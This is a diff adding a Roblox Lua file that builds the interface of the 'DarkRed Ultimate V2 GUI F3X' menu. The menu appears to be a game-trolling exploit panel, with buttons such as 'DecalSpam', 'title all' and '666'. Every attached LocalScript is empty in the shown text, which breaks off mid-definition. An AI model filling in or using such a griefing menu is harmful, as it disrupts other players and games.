@@ -1,0 +1,7356 @@
+-- // INSTANCES: 167 | SCRIPTS: 68 | MODULES: 0 \\ --
+
+local UI = {}
+
+-- // StarterGui.ScreenGui \\ --
+UI["1"] = Instance.new("ScreenGui", game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui"))
+UI["1"]["ZIndexBehavior"] = Enum.ZIndexBehavior.Sibling
+
+-- // StarterGui.ScreenGui.ImageLabel \\ --
+UI["2"] = Instance.new("ImageLabel", UI["1"])
+UI["2"]["BorderSizePixel"] = 2
+UI["2"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0)
+UI["2"]["ImageTransparency"] = 0.54
+-- [ERROR] cannot convert ImageContent
+UI["2"]["Image"] = [[rbxassetid://2446234250]]
+UI["2"]["Size"] = UDim2.new(0, 767, 0, 437)
+UI["2"]["BorderColor3"] = Color3.fromRGB(255, 171, 0)
+UI["2"]["Position"] = UDim2.new(0.192, -14, 0.11079, 5)
+
+-- // StarterGui.ScreenGui.ImageLabel.information \\ --
+UI["3"] = Instance.new("Frame", UI["2"])
+UI["3"]["BorderSizePixel"] = 2
+UI["3"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0)
+UI["3"]["Size"] = UDim2.new(0, 241, 0, 436)
+UI["3"]["Position"] = UDim2.new(0.68528, 0, 0.00229, 0)
+UI["3"]["Name"] = [[information]]
+UI["3"]["BorderColor3"] = Color3.fromRGB(255, 171, 0)
+
+-- // StarterGui.ScreenGui.ImageLabel.information.user \\ --
+UI["4"] = Instance.new("TextLabel", UI["3"])
+UI["4"]["TextWrapped"] = true
+UI["4"]["BorderSizePixel"] = 2
+UI["4"]["TextXAlignment"] = Enum.TextXAlignment.Left
+UI["4"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255)
+UI["4"]["TextSize"] = 24
+UI["4"]["TextScaled"] = true
+UI["4"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0)
+UI["4"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
+UI["4"]["FontFace"] = Font.new([[rbxasset://fonts/families/RomanAntique.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal)
+UI["4"]["Size"] = UDim2.new(0, 241, 0, 36)
+UI["4"]["BorderColor3"] = Color3.fromRGB(255, 171, 0)
+UI["4"]["Text"] = [[user:]]
+UI["4"]["Name"] = [[user]]
+UI["4"]["Position"] = UDim2.new(-0.00113, 0, 0.36214, 0)
+
+-- // StarterGui.ScreenGui.ImageLabel.information.user.LocalScript \\ --
+UI["5"] = Instance.new("LocalScript", UI["4"])
+
+
+-- // StarterGui.ScreenGui.ImageLabel.information.Country \\ --
+UI["6"] = Instance.new("TextLabel", UI["3"])
+UI["6"]["TextWrapped"] = true
+UI["6"]["BorderSizePixel"] = 2
+UI["6"]["TextXAlignment"] = Enum.TextXAlignment.Left
+UI["6"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255)
+UI["6"]["TextSize"] = 24
+UI["6"]["TextScaled"] = true
+UI["6"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0)
+UI["6"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
+UI["6"]["FontFace"] = Font.new([[rbxasset://fonts/families/RomanAntique.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal)
+UI["6"]["Size"] = UDim2.new(0, 241, 0, 34)
+UI["6"]["BorderColor3"] = Color3.fromRGB(255, 171, 0)
+UI["6"]["Text"] = [[Country:]]
+UI["6"]["Name"] = [[Country]]
+UI["6"]["Position"] = UDim2.new(0.38174, -92, 0.47155, -12)
+
+-- // StarterGui.ScreenGui.ImageLabel.information.Country.LocalScript \\ --
+UI["7"] = Instance.new("LocalScript", UI["6"])
+
+
+-- // StarterGui.ScreenGui.ImageLabel.information.Age days \\ --
+UI["8"] = Instance.new("TextLabel", UI["3"])
+UI["8"]["TextWrapped"] = true
+UI["8"]["BorderSizePixel"] = 2
+UI["8"]["TextXAlignment"] = Enum.TextXAlignment.Left
+UI["8"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255)
+UI["8"]["TextSize"] = 24
+UI["8"]["TextScaled"] = true
+UI["8"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0)
+UI["8"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
+UI["8"]["FontFace"] = Font.new([[rbxasset://fonts/families/RomanAntique.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal)
+UI["8"]["Size"] = UDim2.new(0, 241, 0, 29)
+UI["8"]["BorderColor3"] = Color3.fromRGB(255, 171, 0)
+UI["8"]["Text"] = [[Age Days:]]
+UI["8"]["Name"] = [[Age days]]
+UI["8"]["Position"] = UDim2.new(0, 0, 0.52091, 0)
+
+-- // StarterGui.ScreenGui.ImageLabel.information.Age days.LocalScript \\ --
+UI["9"] = Instance.new("LocalScript", UI["8"])
+
+
+-- // StarterGui.ScreenGui.ImageLabel.information.Game id \\ --
+UI["a"] = Instance.new("TextLabel", UI["3"])
+UI["a"]["TextWrapped"] = true
+UI["a"]["BorderSizePixel"] = 2
+UI["a"]["TextXAlignment"] = Enum.TextXAlignment.Left
+UI["a"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255)
+UI["a"]["TextSize"] = 24
+UI["a"]["TextScaled"] = true
+UI["a"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0)
+UI["a"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
+UI["a"]["FontFace"] = Font.new([[rbxasset://fonts/families/RomanAntique.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal)
+UI["a"]["Size"] = UDim2.new(0, 240, 0, 30)
+UI["a"]["BorderColor3"] = Color3.fromRGB(255, 171, 0)
+UI["a"]["Text"] = [[Game ID:  ]]
+UI["a"]["Name"] = [[Game id]]
+UI["a"]["Position"] = UDim2.new(0.00449, 0, 0.58667, 0)
+
+-- // StarterGui.ScreenGui.ImageLabel.information.Game id.LocalScript \\ --
+UI["b"] = Instance.new("LocalScript", UI["a"])
+
+
+-- // StarterGui.ScreenGui.ImageLabel.information.TextLabel \\ --
+UI["c"] = Instance.new("TextLabel", UI["3"])
+UI["c"]["TextWrapped"] = true
+UI["c"]["BorderSizePixel"] = 2
+UI["c"]["TextXAlignment"] = Enum.TextXAlignment.Left
+UI["c"]["TextSize"] = 28
+UI["c"]["TextYAlignment"] = Enum.TextYAlignment.Top
+UI["c"]["TextScaled"] = true
+UI["c"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0)
+UI["c"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
+UI["c"]["FontFace"] = Font.new([[rbxasset://fonts/families/RomanAntique.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal)
+UI["c"]["Size"] = UDim2.new(0, 240, 0, 151)
+UI["c"]["BorderColor3"] = Color3.fromRGB(255, 171, 0)
+UI["c"]["Text"] = [[Aloh skid, welcome to my DarkRed Ultimate v2 GUI. This GUI was created by 1x6xjxG (Dr2s); please give him credit if you decide to upload a video showcasing this GUI.]]
+UI["c"]["Position"] = UDim2.new(0.38623, -92, 0.7895, -59)
+
+-- // StarterGui.ScreenGui.ImageLabel.information.ImageLabel \\ --
+UI["d"] = Instance.new("ImageLabel", UI["3"])
+UI["d"]["BorderSizePixel"] = 2
+UI["d"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0)
+-- [ERROR] cannot convert ImageContent
+UI["d"]["Image"] = [[rbxassetid://115604274202517]]
+UI["d"]["Size"] = UDim2.new(0, 241, 0, 160)
+UI["d"]["BorderColor3"] = Color3.fromRGB(255, 171, 0)
+UI["d"]["Position"] = UDim2.new(0, 0, -0, 0)
+
+-- // StarterGui.ScreenGui.ImageLabel.information.ImageLabel \\ --
+UI["e"] = Instance.new("ImageLabel", UI["3"])
+UI["e"]["BorderSizePixel"] = 0
+UI["e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
+-- [ERROR] cannot convert ImageContent
+UI["e"]["ImageColor3"] = Color3.fromRGB(255, 82, 0)
+UI["e"]["Image"] = [[rbxasset://textures/ui/GuiImagePlaceholder.png]]
+UI["e"]["Size"] = UDim2.new(0, 186, 0, 151)
+UI["e"]["BackgroundTransparency"] = 1
+UI["e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
+UI["e"]["Position"] = UDim2.new(0.11241, 0, 0.02051, 0)
+
+-- // StarterGui.ScreenGui.ImageLabel.information.ImageLabel.LocalScript \\ --
+UI["f"] = Instance.new("LocalScript", UI["e"])
+
+
+-- // StarterGui.ScreenGui.ImageLabel.UIDragDetector \\ --
+UI["10"] = Instance.new("UIDragDetector", UI["2"])
+
+
+-- // StarterGui.ScreenGui.ImageLabel.TextLabel \\ --
+UI["11"] = Instance.new("TextLabel", UI["2"])
+UI["11"]["TextWrapped"] = true
+UI["11"]["BorderSizePixel"] = 2
+UI["11"]["TextXAlignment"] = Enum.TextXAlignment.Left
+UI["11"]["TextSize"] = 43
+UI["11"]["TextYAlignment"] = Enum.TextYAlignment.Bottom
+UI["11"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0)
+UI["11"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
+UI["11"]["FontFace"] = Font.new([[rbxasset://fonts/families/RomanAntique.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal)
+UI["11"]["Size"] = UDim2.new(0, 767, 0, 49)
+UI["11"]["BorderColor3"] = Color3.fromRGB(255, 171, 0)
+UI["11"]["Text"] = [[DarkRed Ultimate V2 GUI F3X]]
+UI["11"]["Position"] = UDim2.new(0.00136, 0, -0.109, 0)
+
+-- // StarterGui.ScreenGui.ImageLabel.Script \\ --
+UI["12"] = Instance.new("ScrollingFrame", UI["2"])
+UI["12"]["Active"] = true
+UI["12"]["BorderSizePixel"] = 2
+UI["12"]["CanvasPosition"] = Vector2.new(0, 200)
+UI["12"]["Position"] = UDim2.new(0.03064, 0, 0.02025, 0)
+UI["12"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0)
+UI["12"]["Size"] = UDim2.new(0, 485, 0, 208)
+UI["12"]["ScrollBarImageColor3"] = Color3.fromRGB(0, 0, 0)
+UI["12"]["Name"] = [[Script]]
+UI["12"]["BorderColor3"] = Color3.fromRGB(255, 171, 0)
+
+-- // StarterGui.ScreenGui.ImageLabel.Script.message \\ --
+UI["13"] = Instance.new("TextButton", UI["12"])
+UI["13"]["TextWrapped"] = true
+UI["13"]["BorderSizePixel"] = 2
+UI["13"]["TextSize"] = 14
+UI["13"]["TextScaled"] = true
+UI["13"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
+UI["13"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0)
+UI["13"]["FontFace"] = Font.new([[rbxasset://fonts/families/RomanAntique.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal)
+UI["13"]["Size"] = UDim2.new(0, 114, 0, 50)
+UI["13"]["Name"] = [[message]]
+UI["13"]["BorderColor3"] = Color3.fromRGB(255, 171, 0)
+UI["13"]["Text"] = [[Message]]
+UI["13"]["Position"] = UDim2.new(0.49538, 0, 0.11933, 0)
+
+-- // StarterGui.ScreenGui.ImageLabel.Script.message.LocalScript \\ --
+UI["14"] = Instance.new("LocalScript", UI["13"])
+
+
+-- // StarterGui.ScreenGui.ImageLabel.Script.666 \\ --
+UI["15"] = Instance.new("TextButton", UI["12"])
+UI["15"]["TextWrapped"] = true
+UI["15"]["BorderSizePixel"] = 2
+UI["15"]["TextSize"] = 14
+UI["15"]["TextScaled"] = true
+UI["15"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
+UI["15"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0)
+UI["15"]["FontFace"] = Font.new([[rbxasset://fonts/families/RomanAntique.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal)
+UI["15"]["Size"] = UDim2.new(0, 114, 0, 50)
+UI["15"]["Name"] = [[666]]
+UI["15"]["BorderColor3"] = Color3.fromRGB(255, 171, 0)
+UI["15"]["Text"] = [[666]]
+UI["15"]["Position"] = UDim2.new(0.73509, 0, 0, 0)
+
+-- // StarterGui.ScreenGui.ImageLabel.Script.666.LocalScript \\ --
+UI["16"] = Instance.new("LocalScript", UI["15"])
+
+
+-- // StarterGui.ScreenGui.ImageLabel.Script.title me \\ --
+UI["17"] = Instance.new("TextButton", UI["12"])
+UI["17"]["TextWrapped"] = true
+UI["17"]["BorderSizePixel"] = 2
+UI["17"]["TextSize"] = 14
+UI["17"]["TextScaled"] = true
+UI["17"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
+UI["17"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0)
+UI["17"]["FontFace"] = Font.new([[rbxasset://fonts/families/RomanAntique.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal)
+UI["17"]["Size"] = UDim2.new(0, 117, 0, 50)
+UI["17"]["Name"] = [[title me]]
+UI["17"]["BorderColor3"] = Color3.fromRGB(255, 171, 0)
+UI["17"]["Text"] = [[title me]]
+UI["17"]["Position"] = UDim2.new(0.24769, 0, 0.11933, 0)
+
+-- // StarterGui.ScreenGui.ImageLabel.Script.title me.LocalScript \\ --
+UI["18"] = Instance.new("LocalScript", UI["17"])
+
+
+-- // StarterGui.ScreenGui.ImageLabel.Script.title all \\ --
+UI["19"] = Instance.new("TextButton", UI["12"])
+UI["19"]["TextWrapped"] = true
+UI["19"]["BorderSizePixel"] = 2
+UI["19"]["TextSize"] = 14
+UI["19"]["TextScaled"] = true
+UI["19"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
+UI["19"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0)
+UI["19"]["FontFace"] = Font.new([[rbxasset://fonts/families/RomanAntique.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal)
+UI["19"]["Size"] = UDim2.new(0, 117, 0, 50)
+UI["19"]["Name"] = [[title all]]
+UI["19"]["BorderColor3"] = Color3.fromRGB(255, 171, 0)
+UI["19"]["Text"] = [[title all]]
+UI["19"]["Position"] = UDim2.new(0, 0, 0.11933, 0)
+
+-- // StarterGui.ScreenGui.ImageLabel.Script.title all.LocalScript \\ --
+UI["1a"] = Instance.new("LocalScript", UI["19"])
+
+
+-- // StarterGui.ScreenGui.ImageLabel.Script.patrick \\ --
+UI["1b"] = Instance.new("TextButton", UI["12"])
+UI["1b"]["TextWrapped"] = true
+UI["1b"]["BorderSizePixel"] = 2
+UI["1b"]["TextSize"] = 14
+UI["1b"]["TextScaled"] = true
+UI["1b"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
+UI["1b"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0)
+UI["1b"]["FontFace"] = Font.new([[rbxasset://fonts/families/RomanAntique.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal)
+UI["1b"]["Size"] = UDim2.new(0, 114, 0, 50)
+UI["1b"]["Name"] = [[patrick]]
+UI["1b"]["BorderColor3"] = Color3.fromRGB(255, 171, 0)
+UI["1b"]["Text"] = [[Patrick Wraith]]
+UI["1b"]["Position"] = UDim2.new(0.49538, 0, 0, 0)
+
+-- // StarterGui.ScreenGui.ImageLabel.Script.patrick.LocalScript \\ --
+UI["1c"] = Instance.new("LocalScript", UI["1b"])
+
+
+-- // StarterGui.ScreenGui.ImageLabel.Script.message 2 \\ --
+UI["1d"] = Instance.new("TextButton", UI["12"])
+UI["1d"]["TextWrapped"] = true
+UI["1d"]["BorderSizePixel"] = 2
+UI["1d"]["TextSize"] = 14
+UI["1d"]["TextScaled"] = true
+UI["1d"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
+UI["1d"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0)
+UI["1d"]["FontFace"] = Font.new([[rbxasset://fonts/families/RomanAntique.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal)
+UI["1d"]["Size"] = UDim2.new(0, 114, 0, 49)
+UI["1d"]["Name"] = [[message 2]]
+UI["1d"]["BorderColor3"] = Color3.fromRGB(255, 171, 0)
+UI["1d"]["Text"] = [[Message 2]]
+UI["1d"]["Position"] = UDim2.new(0.85294, -57, 0.14797, -24)
+
+-- // StarterGui.ScreenGui.ImageLabel.Script.message 2.LocalScript \\ --
+UI["1e"] = Instance.new("LocalScript", UI["1d"])
+
+
+-- // StarterGui.ScreenGui.ImageLabel.Script.777 \\ --
+UI["1f"] = Instance.new("TextButton", UI["12"])
+UI["1f"]["TextWrapped"] = true
+UI["1f"]["BorderSizePixel"] = 2
+UI["1f"]["TextSize"] = 14
+UI["1f"]["TextScaled"] = true
+UI["1f"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
+UI["1f"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0)
+UI["1f"]["FontFace"] = Font.new([[rbxasset://fonts/families/RomanAntique.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal)
+UI["1f"]["Size"] = UDim2.new(0, 117, 0, 50)
+UI["1f"]["Name"] = [[777]]
+UI["1f"]["BorderColor3"] = Color3.fromRGB(255, 171, 0)
+UI["1f"]["Text"] = [[777]]
+UI["1f"]["Position"] = UDim2.new(0, 0, 0.05967, 0)
+
+-- // StarterGui.ScreenGui.ImageLabel.Script.777.LocalScript \\ --
+UI["20"] = Instance.new("LocalScript", UI["1f"])
+
+
+-- // StarterGui.ScreenGui.ImageLabel.Script.Particles \\ --
+UI["21"] = Instance.new("TextButton", UI["12"])
+UI["21"]["TextWrapped"] = true
+UI["21"]["BorderSizePixel"] = 2
+UI["21"]["TextSize"] = 14
+UI["21"]["TextScaled"] = true
+UI["21"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
+UI["21"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0)
+UI["21"]["FontFace"] = Font.new([[rbxasset://fonts/families/RomanAntique.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal)
+UI["21"]["Size"] = UDim2.new(0, 117, 0, 50)
+UI["21"]["Name"] = [[Particles]]
+UI["21"]["BorderColor3"] = Color3.fromRGB(255, 171, 0)
+UI["21"]["Text"] = [[Particles]]
+UI["21"]["Position"] = UDim2.new(-0, 0, 0, 0)
+
+-- // StarterGui.ScreenGui.ImageLabel.Script.Particles.LocalScript \\ --
+UI["22"] = Instance.new("LocalScript", UI["21"])
+
+
+-- // StarterGui.ScreenGui.ImageLabel.Script.SkyBox \\ --
+UI["23"] = Instance.new("TextButton", UI["12"])
+UI["23"]["TextWrapped"] = true
+UI["23"]["BorderSizePixel"] = 2
+UI["23"]["TextSize"] = 14
+UI["23"]["TextScaled"] = true
+UI["23"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
+UI["23"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0)
+UI["23"]["FontFace"] = Font.new([[rbxasset://fonts/families/RomanAntique.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal)
+UI["23"]["Size"] = UDim2.new(0, 117, 0, 50)
+UI["23"]["Name"] = [[SkyBox]]
+UI["23"]["BorderColor3"] = Color3.fromRGB(255, 171, 0)
+UI["23"]["Text"] = [[SkyBox]]
+UI["23"]["Position"] = UDim2.new(0, 0, 0.23866, 0)
+
+-- // StarterGui.ScreenGui.ImageLabel.Script.SkyBox.LocalScript \\ --
+UI["24"] = Instance.new("LocalScript", UI["23"])
+
+
+-- // StarterGui.ScreenGui.ImageLabel.Script.SkyBox 2 \\ --
+UI["25"] = Instance.new("TextButton", UI["12"])
+UI["25"]["TextWrapped"] = true
+UI["25"]["BorderSizePixel"] = 2
+UI["25"]["TextSize"] = 14
+UI["25"]["TextScaled"] = true
+UI["25"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
+UI["25"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0)
+UI["25"]["FontFace"] = Font.new([[rbxasset://fonts/families/RomanAntique.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal)
+UI["25"]["Size"] = UDim2.new(0, 117, 0, 50)
+UI["25"]["Name"] = [[SkyBox 2]]
+UI["25"]["BorderColor3"] = Color3.fromRGB(255, 171, 0)
+UI["25"]["Text"] = [[SkyBox 2]]
+UI["25"]["Position"] = UDim2.new(0.24769, 0, 0.23866, 0)
+
+-- // StarterGui.ScreenGui.ImageLabel.Script.SkyBox 2.LocalScript \\ --
+UI["26"] = Instance.new("LocalScript", UI["25"])
+
+
+-- // StarterGui.ScreenGui.ImageLabel.Script.SkyBox 3 \\ --
+UI["27"] = Instance.new("TextButton", UI["12"])
+UI["27"]["TextWrapped"] = true
+UI["27"]["BorderSizePixel"] = 2
+UI["27"]["TextSize"] = 14
+UI["27"]["TextScaled"] = true
+UI["27"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
+UI["27"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0)
+UI["27"]["FontFace"] = Font.new([[rbxasset://fonts/families/RomanAntique.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal)
+UI["27"]["Size"] = UDim2.new(0, 114, 0, 50)
+UI["27"]["Name"] = [[SkyBox 3]]
+UI["27"]["BorderColor3"] = Color3.fromRGB(255, 171, 0)
+UI["27"]["Text"] = [[SkyBox 3]]
+UI["27"]["Position"] = UDim2.new(0.49539, 0, 0.23866, 0)
+
+-- // StarterGui.ScreenGui.ImageLabel.Script.SkyBox 3.LocalScript \\ --
+UI["28"] = Instance.new("LocalScript", UI["27"])
+
+
+-- // StarterGui.ScreenGui.ImageLabel.Script.SkyBox 4 \\ --
+UI["29"] = Instance.new("TextButton", UI["12"])
+UI["29"]["TextWrapped"] = true
+UI["29"]["BorderSizePixel"] = 2
+UI["29"]["TextSize"] = 14
+UI["29"]["TextScaled"] = true
+UI["29"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
+UI["29"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0)
+UI["29"]["FontFace"] = Font.new([[rbxasset://fonts/families/RomanAntique.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal)
+UI["29"]["Size"] = UDim2.new(0, 114, 0, 50)
+UI["29"]["Name"] = [[SkyBox 4]]
+UI["29"]["BorderColor3"] = Color3.fromRGB(255, 171, 0)
+UI["29"]["Text"] = [[SkyBox 4]]
+UI["29"]["Position"] = UDim2.new(0.73509, 0, 0.23866, 0)
+
+-- // StarterGui.ScreenGui.ImageLabel.Script.SkyBox 4.LocalScript \\ --
+UI["2a"] = Instance.new("LocalScript", UI["29"])
+
+
+-- // StarterGui.ScreenGui.ImageLabel.Script.SkyBox Rotate \\ --
+UI["2b"] = Instance.new("TextButton", UI["12"])
+UI["2b"]["TextWrapped"] = true
+UI["2b"]["BorderSizePixel"] = 2
+UI["2b"]["TextSize"] = 14
+UI["2b"]["TextScaled"] = true
+UI["2b"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
+UI["2b"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0)
+UI["2b"]["FontFace"] = Font.new([[rbxasset://fonts/families/RomanAntique.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal)
+UI["2b"]["Size"] = UDim2.new(0, 117, 0, 50)
+UI["2b"]["Name"] = [[SkyBox Rotate]]
+UI["2b"]["BorderColor3"] = Color3.fromRGB(255, 171, 0)
+UI["2b"]["Text"] = [[SkyBox Rotate]]
+UI["2b"]["Position"] = UDim2.new(0, 0, 0.29833, 0)
+
+-- // StarterGui.ScreenGui.ImageLabel.Script.SkyBox Rotate.LocalScript \\ --
+UI["2c"] = Instance.new("LocalScript", UI["2b"])
+
+
+-- // StarterGui.ScreenGui.ImageLabel.Script.SkyBox Rotate 2 \\ --
+UI["2d"] = Instance.new("TextButton", UI["12"])
+UI["2d"]["TextWrapped"] = true
+UI["2d"]["BorderSizePixel"] = 2
+UI["2d"]["TextSize"] = 14
+UI["2d"]["TextScaled"] = true
+UI["2d"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
+UI["2d"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0)
+UI["2d"]["FontFace"] = Font.new([[rbxasset://fonts/families/RomanAntique.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal)
+UI["2d"]["Size"] = UDim2.new(0, 116, 0, 50)
+UI["2d"]["Name"] = [[SkyBox Rotate 2]]
+UI["2d"]["BorderColor3"] = Color3.fromRGB(255, 171, 0)
+UI["2d"]["Text"] = [[SkyBox Rotate 2]]
+UI["2d"]["Position"] = UDim2.new(0.24769, 0, 0.29833, 0)
+
+-- // StarterGui.ScreenGui.ImageLabel.Script.SkyBox Rotate 2.LocalScript \\ --
+UI["2e"] = Instance.new("LocalScript", UI["2d"])
+
+
+-- // StarterGui.ScreenGui.ImageLabel.Script.SkyBox Rotate 3 \\ --
+UI["2f"] = Instance.new("TextButton", UI["12"])
+UI["2f"]["TextWrapped"] = true
+UI["2f"]["BorderSizePixel"] = 2
+UI["2f"]["TextSize"] = 14
+UI["2f"]["TextScaled"] = true
+UI["2f"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
+UI["2f"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0)
+UI["2f"]["FontFace"] = Font.new([[rbxasset://fonts/families/RomanAntique.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal)
+UI["2f"]["Size"] = UDim2.new(0, 115, 0, 54)
+UI["2f"]["Name"] = [[SkyBox Rotate 3]]
+UI["2f"]["BorderColor3"] = Color3.fromRGB(255, 171, 0)
+UI["2f"]["Text"] = [[Skybox Rotate 3]]
+UI["2f"]["Position"] = UDim2.new(0.61134, -57, 0.321, -25)
+
+-- // StarterGui.ScreenGui.ImageLabel.Script.SkyBox Rotate 3.LocalScript \\ --
+UI["30"] = Instance.new("LocalScript", UI["2f"])
+
+
+-- // StarterGui.ScreenGui.ImageLabel.Script.SkyBox Rotate 4 \\ --
+UI["31"] = Instance.new("TextButton", UI["12"])
+UI["31"]["TextWrapped"] = true
+UI["31"]["BorderSizePixel"] = 2
+UI["31"]["TextSize"] = 14
+UI["31"]["TextScaled"] = true
+UI["31"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
+UI["31"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0)
+UI["31"]["FontFace"] = Font.new([[rbxasset://fonts/families/RomanAntique.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal)
+UI["31"]["Size"] = UDim2.new(0, 114, 0, 49)
+UI["31"]["Name"] = [[SkyBox Rotate 4]]
+UI["31"]["BorderColor3"] = Color3.fromRGB(255, 171, 0)
+UI["31"]["Text"] = [[SkyBox Rotate 4]]
+UI["31"]["Position"] = UDim2.new(0.73488, 0, 0.29833, 0)
+
+-- // StarterGui.ScreenGui.ImageLabel.Script.SkyBox Rotate 4.LocalScript \\ --
+UI["32"] = Instance.new("LocalScript", UI["31"])
+
+
+-- // StarterGui.ScreenGui.ImageLabel.Script.TextButton \\ --
+UI["33"] = Instance.new("TextButton", UI["12"])
+UI["33"]["TextWrapped"] = true
+UI["33"]["BorderSizePixel"] = 2
+UI["33"]["TextSize"] = 14
+UI["33"]["TextScaled"] = true
+UI["33"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
+UI["33"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0)
+UI["33"]["FontFace"] = Font.new([[rbxasset://fonts/families/RomanAntique.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal)
+UI["33"]["Size"] = UDim2.new(0, 117, 0, 50)
+UI["33"]["BorderColor3"] = Color3.fromRGB(255, 171, 0)
+UI["33"]["Text"] = [[DecalSpam]]
+UI["33"]["Position"] = UDim2.new(0, 0, 0.179, 0)
+
+-- // StarterGui.ScreenGui.ImageLabel.Script.TextButton.LocalScript \\ --
+UI["34"] = Instance.new("LocalScript", UI["33"])
+
+
+-- // StarterGui.ScreenGui.ImageLabel.Script.TextButton \\ --
+UI["35"] = Instance.new("TextButton", UI["12"])
+UI["35"]["TextWrapped"] = true
+UI["35"]["BorderSizePixel"] = 2
+UI["35"]["TextSize"] = 14
+UI["35"]["TextScaled"] = true
+UI["35"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
+UI["35"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0)
+UI["35"]["FontFace"] = Font.new([[rbxasset://fonts/families/RomanAntique.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal)
+UI["35"]["Size"] = UDim2.new(0, 117, 0, 50)
+UI["35"]["BorderColor3"] = Color3.fromRGB(255, 171, 0)
+UI["35"]["Text"] = [[DecalSpam 2]]
+UI["35"]["Position"] = UDim2.new(0.24769, 0, 0.179, 0)
+
+-- // StarterGui.ScreenGui.ImageLabel.Script.TextButton.LocalScript \\ --
+UI["36"] = Instance.new("LocalScript", UI["35"])
+
+
+-- // StarterGui.ScreenGui.ImageLabel.Script.TextButton \\ --
+UI["37"] = Instance.new("TextButton", UI["12"])
+UI["37"]["TextWrapped"] = true
+UI["37"]["BorderSizePixel"] = 2
+UI["37"]["TextSize"] = 14
+UI["37"]["TextScaled"] = true
+UI["37"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
+UI["37"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0)
+UI["37"]["FontFace"] = Font.new([[rbxasset://fonts/families/RomanAntique.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal)
+UI["37"]["Size"] = UDim2.new(0, 114, 0, 50)
+UI["37"]["BorderColor3"] = Color3.fromRGB(255, 171, 0)
+UI["37"]["Text"] = [[DecalSpam 3]]
+UI["37"]["Position"] = UDim2.new(0.49538, 0, 0.179, 0)
+
+-- // StarterGui.ScreenGui.ImageLabel.Script.TextButton.LocalScript \\ --
+UI["38"] = Instance.new("LocalScript", UI["37"])
+
+
+-- // StarterGui.ScreenGui.ImageLabel.Script.TextButton \\ --
+UI["39"] = Instance.new("TextButton", UI["12"])
